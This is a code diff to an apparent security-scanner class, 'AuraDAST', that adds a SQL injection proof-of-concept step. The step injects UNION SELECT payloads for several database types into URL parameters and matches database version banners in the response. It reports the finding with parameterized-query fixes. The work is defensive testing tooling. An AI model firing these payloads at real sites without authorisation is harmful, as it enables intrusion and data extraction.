@@ -77,6 +77,83 @@ class AuraDAST:
         except:
             return None
 
+    async def _extract_sqli_poc(self, url: str, param_name: str, param_value: str) -> dict | None:
+        """
+        v4.0 Deterministic PoC: UNION SELECT to extract real DB name/version.
+        Fires targeted UNION SELECT payloads for each DB type.
+        If DB banner appears in the HTTP response, exploitation is PROVEN with real data.
+        """
+        from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
+        import re
+
+        parsed = urlparse(url)
+        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
+
+        # Payloads per DB type — extract version() or db_name()
+        poc_payloads = [
+            # MySQL
+            ("MySQL",      "' UNION SELECT NULL,version(),database()--"),
+            ("MySQL",      "' UNION SELECT version(),database(),NULL--"),
+            # MSSQL
+            ("MSSQL",     "' UNION SELECT NULL,@@version,db_name()--"),
+            ("MSSQL",     "'; SELECT @@version--"),
+            # PostgreSQL
+            ("PostgreSQL", "' UNION SELECT NULL,version(),current_database()--"),
+            # SQLite
+            ("SQLite",     "' UNION SELECT NULL,sqlite_version()--"),
+        ]
+
+        # Fingerprints: strings that only appear when DB data is in the response
+        DB_FINGERPRINTS = [
+            r"MySQL\s[\d\.]+",
+            r"MariaDB",
+            r"Microsoft SQL Server\s[\d]+",
+            r"PostgreSQL\s[\d\.]+",
+            r"SQLite\s[\d\.]+",
+        ]
+
+        for db_type, payload in poc_payloads:
+            try:
+                test_params = {**params, param_name: str(param_value) + payload}
+                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
+                res = await self.session.get(test_url, timeout=8)
+                body = res.text
+
+                for pattern in DB_FINGERPRINTS:
+                    match = re.search(pattern, body, re.IGNORECASE)
+                    if match:
+                        extracted = match.group(0)
+                        cvss = self.CVSS_SCORES["SQL Injection"]
+                        console.print(f"[bold red blink][!!!] SQLi PoC EXTRACTED: Real DB banner '{extracted}' found in response![/bold red blink]")
+                        return {
+                            "type": "SQL Injection (PoC Data Extraction)",
+                            "severity": "CRITICAL",
+                            "cvss_score": cvss["score"],
+                            "cvss_vector": cvss["vector"],
+                            "owasp": "A03:2021-Injection",
+                            "mitre": "T1005 - Data from Local System",
+                            "content": (
+                                f"PoC SQLi CONFIRMED: Real {db_type} banner extracted from response!\n"
+                                f"Extracted: '{extracted}'\n"
+                                f"Payload: '{payload}'\n"
+                                f"URL: {test_url}"
+                            ),
+                            "remediation_fix": (
+                                "# PHP (PDO - parameterized):\n"
+                                "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n"
+                                "$stmt->execute([$id]);\n\n"
+                                "# ASP.NET (C#):\n"
+                                "var cmd = new SqlCommand('SELECT * FROM users WHERE id = @id', conn);\n"
+                                "cmd.Parameters.AddWithValue('@id', id);\n\n"
+                                "# Node.js (pg):\n"
+                                "const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);"
+                            ),
+                            "impact_desc": f"CRITICAL: Attacker extracted real {db_type} server version ({extracted}). Full DB dump possible.",
+                            "patch_priority": "IMMEDIATE",
+                        }
+            except: pass
+        return None
+
     async def _test_time_based_sqli(self, url: str, param_name: str, param_value: str):
         """v2.0 Deterministic: Blind Time-Based SQLi via SLEEP/WAITFOR. Confirms by response delay."""
         import time
@@ -283,11 +360,18 @@ class AuraDAST:
         for param, values in query_params.items():
             orig_value = values[0] if values else ""
             
+            # v4.0: PoC SQLi Extraction (UNION SELECT) — highest confidence, try first
+            poc_sqli = await self._extract_sqli_poc(url, param, orig_value)
+            if poc_sqli:
+                url_findings.append(poc_sqli)
+                continue  # Exploitation proven; skip all further tests on this param
+
             # v2.0: Time-Based Blind SQLi
             time_sqli_hit = await self._test_time_based_sqli(url, param, orig_value)
             if time_sqli_hit:
                 url_findings.append(time_sqli_hit)
                 continue  # Skip further tests on this param; already proven
+
             
             # v3.0: Boolean-Based Blind SQLi (AND 1=1 vs AND 1=2)
             bool_sqli_hit = await self._test_boolean_sqli(url, param, orig_value)
